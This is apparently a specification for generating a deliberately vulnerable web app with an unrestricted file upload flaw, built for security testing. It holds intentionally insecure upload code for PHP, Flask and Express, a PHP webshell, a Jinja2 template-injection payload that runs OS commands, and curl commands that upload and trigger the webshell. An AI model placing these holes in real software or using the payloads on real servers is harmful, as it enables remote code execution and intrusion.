---
id: file_upload_bypass
type: web_vulnerability
description: An unrestricted file upload vulnerability where the application accepts and stores files without validating their type or extension, allowing upload of executable scripts (e.g. PHP webshells) that can be triggered via a direct HTTP request.
required_vars: []
---
# Atom: Unrestricted File Upload (Webshell)

The application accepts file uploads and stores them in a web-accessible directory without validating file type, MIME type, or extension. An attacker uploads an executable script (PHP webshell, Python script served by a CGI handler) and then requests it directly from the web server to achieve code execution.

**This vulnerability is most impactful on PHP/Apache**, where `.php` files in the webroot are executed automatically by Apache. For Python/Node runtimes, the synthesis guidance describes an alternative approach where the app itself executes uploaded content.

### Logic Requirements:
1. The application accepts a file via a multipart form POST.
2. The uploaded file is saved to a directory under the webroot (e.g. `/var/www/html/uploads/`).
3. No validation of file extension, MIME type, or file content is performed.
4. The saved file is accessible via a predictable URL path.
5. For PHP/Apache: Apache executes `.php` files in the uploads directory automatically.

### Synthesis Guidance:
The cover story is a document upload feature — a profile picture uploader, a CV submission form, or a file sharing portal. The critical mistakes are: saving to the webroot (rather than outside it), keeping the original filename (or a predictable one), and not restricting file types.

**PHP (Apache + Apache PHP handler — most natural runtime for this vuln):**
```php
$target_dir = "/var/www/html/uploads/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
echo "File uploaded: <a href='/uploads/" . basename($_FILES["file"]["name"]) . "'>View</a>";
```
Attack: Upload a PHP webshell (`<?php system($_GET['cmd']); ?>`) as `shell.php`.
Trigger: `curl "http://target/uploads/shell.php?cmd=id"`

**Python / Flask (alternative: app renders uploaded template):**
Since Flask does not execute uploaded `.py` files via the web server, the vulnerable pattern here is the application reading and rendering an uploaded file as a Jinja2 template — effectively combining file upload with SSTI:
```python
@app.route('/preview')
def preview():
    filename = request.args.get('file')
    content = open(os.path.join(UPLOAD_FOLDER, filename)).read()
    return render_template_string(content)  # VULNERABLE: uploaded file rendered as template
```
Attack: Upload a file containing `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`.

**Node.js / Express (multer — similar alternative):**
```js
app.post('/upload', upload.single('file'), (req, res) => {
    // No type check — saves as-is to uploads/
    res.send('Uploaded: ' + req.file.originalname);
});
// Static serving of uploads/ directory makes saved files accessible
app.use('/uploads', express.static('uploads'));
```
For Node, executing uploaded files requires a separate mechanism (e.g. `require()` or `eval()` on uploaded content). PHP/Apache is strongly preferred for this atom.

### Testing Guidance:
**Layer 1 — Internal state check (PHP/Apache):**
Verify that the uploads directory is web-accessible and that `.php` files are executed:
```bash
# Upload a test PHP script and verify it executes
echo '<?php echo "EXEC_TEST_" . phpversion(); ?>' > /tmp/test.php
curl -s -F "file=@/tmp/test.php" http://localhost/upload
curl -s "http://localhost/uploads/test.php" | grep "EXEC_TEST_"
```
The response to the second request must contain `EXEC_TEST_` followed by a PHP version string, confirming execution.

**Layer 2 — External attack probe (from attacker container):**
```bash
# Upload a PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/ws.php
curl -s -F "file=@/tmp/ws.php" http://target/upload

# Trigger the webshell
curl -s "http://target/uploads/ws.php?cmd=id" | grep "uid="
```
A successful result shows OS command output in the response, confirming RCE via uploaded webshell.
